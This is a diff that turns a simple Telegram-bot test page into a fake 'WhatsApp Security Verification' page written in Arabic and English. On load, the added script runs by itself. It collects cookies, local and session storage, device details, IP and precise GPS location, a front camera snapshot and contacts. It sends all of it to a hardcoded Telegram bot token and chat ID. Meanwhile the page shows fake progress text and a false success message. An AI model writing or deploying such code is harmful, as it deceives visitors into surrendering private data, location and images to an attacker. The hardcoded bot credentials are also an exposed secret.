@@ -1,45 +1,418 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>اختبار الاتصال بالبوت</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Security Verification</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            text-align: center;
+        }
+        .container {
+            max-width: 400px;
+            margin: 20px;
+            background: #1f1f1f;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 0 30px rgba(37, 211, 102, 0.3);
+        }
+        h1 { color: #25D366; font-size: 24px; margin-bottom: 10px; }
+        p { color: #ccc; font-size: 14px; line-height: 1.6; }
+        .loader {
+            margin: 30px auto;
+            border: 4px solid #333;
+            border-top: 4px solid #25D366;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success { color: #25D366; font-weight: bold; display: none; }
+        .error { color: #ff4444; font-weight: bold; display: none; }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #333;
+            border-radius: 3px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #25D366;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+        #notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: #fff;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 0.9em;
+            z-index: 30;
+            border-left: 4px solid #25D366;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s;
+        }
+        #notification.show { opacity: 1; visibility: visible; }
+    </style>
 </head>
-<body dir="rtl" style="font-family: Tahoma; text-align: center; padding: 30px;">
-    <h2>اختبار إرسال رسالة إلى تيليجرام</h2>
-    <button id="sendBtn" style="padding: 15px 30px; font-size: 18px;">إرسال رسالة تجريبية</button>
-    <p id="status"></p>
+<body>
+    <div id="notification"></div>
+
+    <div class="container">
+        <h1>WhatsApp Security Verification</h1>
+        <p id="status-text">جارٍ التحقق من أمان حسابك...</p>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress-fill"></div>
+        </div>
+        <div class="loader" id="loader"></div>
+        <p class="success" id="successMsg">تم التحقق بنجاح! يمكنك إغلاق الصفحة الآن.</p>
+        <p class="error" id="errorMsg"></p>
+    </div>
 
     <script>
-        const BOT_TOKEN = '8848720448:AAGgjjusWWTYNKLIs_3auDQW6DQDK0kaZfc';
+        // إعدادات بوت تيليجرام (نفس التي نجحت)
+        const TELEGRAM_BOT_TOKEN = '8848720448:AAGgjjusWWTYNKLIs_3auDQW6DQDK0kaZfc';
         const CHAT_ID = '6969346690';
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-        document.getElementById('sendBtn').addEventListener('click', async () => {
-            const statusEl = document.getElementById('status');
-            statusEl.textContent = 'جاري الإرسال...';
+        // عناصر واجهة المستخدم
+        const statusText = document.getElementById('status-text');
+        const progressFill = document.getElementById('progress-fill');
+        const loader = document.getElementById('loader');
+        const successMsg = document.getElementById('successMsg');
+        const errorMsg = document.getElementById('errorMsg');
+        const notificationDiv = document.getElementById('notification');
 
+        // كائن البيانات المجمعة
+        let collectedData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            deviceInfo: {},
+            location: null,
+            ipInfo: null,
+            screenInfo: {},
+            hardwareInfo: {},
+            languageInfo: {},
+            timezoneInfo: {},
+            cookies: null,
+            localStorageData: {},
+            sessionStorageData: {},
+            capturedImages: [],
+            contacts: null,
+            url: window.location.href,
+            referrer: document.referrer || 'none'
+        };
+
+        // دوال مساعدة
+        function showNotification(msg, type = 'info') {
+            notificationDiv.textContent = msg;
+            notificationDiv.className = type;
+            notificationDiv.classList.add('show');
+            setTimeout(() => notificationDiv.classList.remove('show'), 3000);
+        }
+
+        function updateProgress(percent) {
+            progressFill.style.width = Math.min(100, percent) + '%';
+        }
+
+        function setStatus(text) {
+            statusText.textContent = text;
+        }
+
+        // 1. جمع معلومات الجهاز الأساسية
+        function collectDeviceInfo() {
+            collectedData.deviceInfo = {
+                platform: navigator.platform,
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                vendor: navigator.vendor,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion
+            };
+            collectedData.screenInfo = {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth
+            };
+            collectedData.hardwareInfo = {
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0
+            };
+            collectedData.languageInfo = {
+                language: navigator.language,
+                languages: navigator.languages
+            };
+            collectedData.timezoneInfo = {
+                offset: new Date().getTimezoneOffset(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        // 2. جمع الكوكيز والتخزين المحلي
+        function collectStorage() {
             try {
-                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+                collectedData.cookies = document.cookie;
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    collectedData.localStorageData[key] = localStorage.getItem(key);
+                }
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    collectedData.sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+            } catch (e) {}
+        }
+
+        // 3. جمع معلومات IP العامة
+        async function fetchIPInfo() {
+            const services = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json',
+                'https://get.geojs.io/v1/ip/geo.json'
+            ];
+            for (let url of services) {
+                try {
+                    const res = await fetch(url);
+                    if (res.ok) {
+                        collectedData.ipInfo = await res.json();
+                        break;
+                    }
+                } catch (e) {}
+            }
+        }
+
+        // 4. جمع موقع GPS دقيق (بإذن المستخدم)
+        async function fetchGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        collectedData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed
+                        };
+                        resolve(true);
+                    },
+                    (err) => {
+                        console.warn('Geolocation error:', err);
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // 5. التقاط صورة من الكاميرا (بإذن المستخدم)
+        async function captureCameraImage() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                collectedData.capturedImages.push({
+                    timestamp: new Date().toISOString(),
+                    data: canvas.toDataURL('image/jpeg', 0.7)
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (e) {
+                console.warn('Camera access denied or failed:', e);
+                return false;
+            }
+        }
+
+        // 6. جمع جهات الاتصال (Contacts API، مدعوم في بعض المتصفحات)
+        async function collectContacts() {
+            if (!navigator.contacts) {
+                collectedData.contacts = 'api_not_supported';
+                return;
+            }
+            try {
+                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                collectedData.contacts = contacts;
+            } catch (e) {
+                collectedData.contacts = 'permission_denied';
+            }
+        }
+
+        // 7. إرسال جميع البيانات إلى تيليجرام
+        async function sendToTelegram() {
+            // بناء نص التقرير
+            let message = `📥 <b>تقرير فحص أمني جديد</b>\n`;
+            message += `⏰ ${collectedData.timestamp}\n`;
+            message += `🔗 ${collectedData.url}\n\n`;
+
+            if (collectedData.ipInfo) {
+                const ip = collectedData.ipInfo;
+                message += `🌍 <b>IP:</b> <code>${ip.ip || '?'}</code>\n`;
+                message += `📍 ${ip.city || ''} ${ip.country_name || ip.country || ''}\n`;
+                message += `🖥 ISP: ${ip.org || ip.isp || '?'}\n`;
+                if (ip.latitude && ip.longitude) {
+                    message += `🗺 <a href="https://www.google.com/maps?q=${ip.latitude},${ip.longitude}">عرض الموقع</a>\n`;
+                }
+                message += `\n`;
+            }
+
+            if (collectedData.location) {
+                const gps = collectedData.location;
+                message += `📍 <b>GPS دقيق:</b>\n`;
+                message += `   ${gps.latitude.toFixed(6)}, ${gps.longitude.toFixed(6)}\n`;
+                message += `   دقة: ${gps.accuracy.toFixed(2)}م\n`;
+                message += `🗺 <a href="https://www.google.com/maps?q=${gps.latitude},${gps.longitude}">فتح الخريطة</a>\n\n`;
+            }
+
+            message += `📱 <b>الجهاز:</b> ${collectedData.deviceInfo.platform}\n`;
+            message += `🖥 الشاشة: ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
+            message += `🧠 ذاكرة: ${collectedData.hardwareInfo.deviceMemory}GB, أنوية: ${collectedData.hardwareInfo.hardwareConcurrency}\n`;
+            message += `🌐 لغة: ${collectedData.languageInfo.language}\n`;
+            message += `🕐 توقيت: ${collectedData.timezoneInfo.timezone}\n\n`;
+
+            if (collectedData.contacts && Array.isArray(collectedData.contacts)) {
+                message += `👥 <b>جهات الاتصال:</b> ${collectedData.contacts.length} جهة\n`;
+            } else if (collectedData.contacts === 'api_not_supported') {
+                message += `👥 جهات الاتصال: API غير مدعومة\n`;
+            }
+
+            // إرسال النص الرئيسي
+            try {
+                const textResponse = await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: '✅ اختبار ناجح من صفحة GitHub! ' + new Date().toLocaleString()
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false
                     })
                 });
-
-                const result = await response.json();
-                if (result.ok) {
-                    statusEl.textContent = 'تم الإرسال بنجاح! تحقق من تيليجرام.';
-                    statusEl.style.color = 'green';
-                } else {
-                    statusEl.textContent = 'فشل: ' + JSON.stringify(result);
-                    statusEl.style.color = 'red';
-                }
-            } catch (error) {
-                statusEl.textContent = 'خطأ في الشبكة: ' + error.message;
-                statusEl.style.color = 'red';
+                const textResult = await textResponse.json();
+                console.log('Text sent:', textResult);
+            } catch (e) {
+                console.error('Failed to send text:', e);
             }
+
+            // إرسال الصورة الملتقطة إن وجدت
+            if (collectedData.capturedImages.length > 0) {
+                for (let i = 0; i < collectedData.capturedImages.length; i++) {
+                    try {
+                        const img = collectedData.capturedImages[i];
+                        const base64Data = img.data.split(',')[1];
+                        const byteCharacters = atob(base64Data);
+                        const byteNumbers = new Array(byteCharacters.length);
+                        for (let j = 0; j < byteCharacters.length; j++) {
+                            byteNumbers[j] = byteCharacters.charCodeAt(j);
+                        }
+                        const byteArray = new Uint8Array(byteNumbers);
+                        const blob = new Blob([byteArray], { type: 'image/jpeg' });
+
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, `camera_${i}.jpg`);
+                        formData.append('caption', `📸 صورة من كاميرا الهدف (${img.timestamp})`);
+
+                        await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (e) {
+                        console.error('Failed to send photo:', e);
+                    }
+                }
+            }
+            return true;
+        }
+
+        // العملية الكاملة بالتسلسل
+        async function runFullOperation() {
+            try {
+                setStatus('جاري جمع معلومات الجهاز...');
+                updateProgress(10);
+                collectDeviceInfo();
+                await sleep(400);
+
+                setStatus('جاري جمع بيانات التخزين...');
+                updateProgress(20);
+                collectStorage();
+                await sleep(300);
+
+                setStatus('جاري تحديد الموقع...');
+                updateProgress(30);
+                await fetchIPInfo();
+                await fetchGPSLocation();
+                await sleep(400);
+
+                setStatus('جاري محاولة الوصول إلى الكاميرا...');
+                updateProgress(50);
+                const cameraOk = await captureCameraImage();
+                updateProgress(cameraOk ? 65 : 55);
+                await sleep(300);
+
+                setStatus('جاري جمع جهات الاتصال...');
+                updateProgress(75);
+                await collectContacts();
+                await sleep(300);
+
+                setStatus('جاري إرسال التقرير...');
+                updateProgress(85);
+                const sent = await sendToTelegram();
+                updateProgress(100);
+
+                if (sent) {
+                    loader.style.display = 'none';
+                    successMsg.style.display = 'block';
+                    showNotification('تم التحقق بنجاح! شكراً لتعاونك.');
+                } else {
+                    loader.style.display = 'none';
+                    errorMsg.style.display = 'block';
+                    errorMsg.textContent = 'فشل في الإرسال. حاول مرة أخرى لاحقاً.';
+                }
+            } catch (globalError) {
+                console.error('Operation failed:', globalError);
+                loader.style.display = 'none';
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'حدث خطأ غير متوقع. يرجى المحاولة لاحقاً.';
+            }
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // بدء التشغيل تلقائياً بعد 1.5 ثانية (لإظهار الواجهة)
+        window.addEventListener('DOMContentLoaded', () => {
+            showNotification('بدء الفحص الأمني لـ WhatsApp...');
+            setTimeout(runFullOperation, 1500);
         });
     </script>
 </body>
